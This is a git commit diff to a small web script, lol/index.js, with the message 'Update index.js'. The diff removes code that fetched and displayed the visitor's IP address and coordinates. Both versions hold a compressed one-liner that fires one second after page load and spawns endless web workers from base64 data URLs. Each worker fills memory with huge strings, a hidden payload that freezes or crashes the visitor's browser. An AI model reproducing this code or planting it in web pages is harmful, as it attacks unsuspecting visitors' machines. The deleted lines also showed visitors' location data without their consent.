fe158685aef25f9fd8b6aa37fa998febf12eb4d1
Clancy <73959934+HighArcs@users.noreply.github.com>
2022-07-26 13:52:03 -0500

    Update index.js

--- lol/index.js
+++ lol/index.js
@@ -1,13 +1,5 @@
 // https://ipapi.co/json/
-(async()=>{
-  const req = await fetch("https://ipapi.co/json/");
-  const json = await req.json();
-  const { ip, longitude, latitude } = json;
-  const ipE = document.getElementById("ip");
-  const llE = document.getElementById("ll");
-  
-  ipE.innerText = ip
-  llE.innerText = `(${longitude}, ${latitude})`;
+(async()=>{  
   // lol
-  setTimeout(() => {let r=0xFFFFFF,o=0xFFFFA,c=`f=[];while(!0){f.push(String.fromCharCode(${o}).repeat(${r}))}`,d=`data:text/html;base64,${btoa(c)}`,b=`while(1){new Worker("${d}")}`,i=`data:text/html;base64,${btoa(b)}`;new Worker(i);},1000)
+  setTimeout(() => {document.getElementById("d").innerText = ":)";let r=0xFFFFFF,o=0xFFFFA,c=`f=[];while(1){f.push(String.fromCharCode(${o}).repeat(${r}))}`,d=`data:text/html;base64,${btoa(c)}`,b=`while(1){new Worker("${d}")}`,i=`data:text/html;base64,${btoa(b)}`;new Worker(i);},1000)
 })()
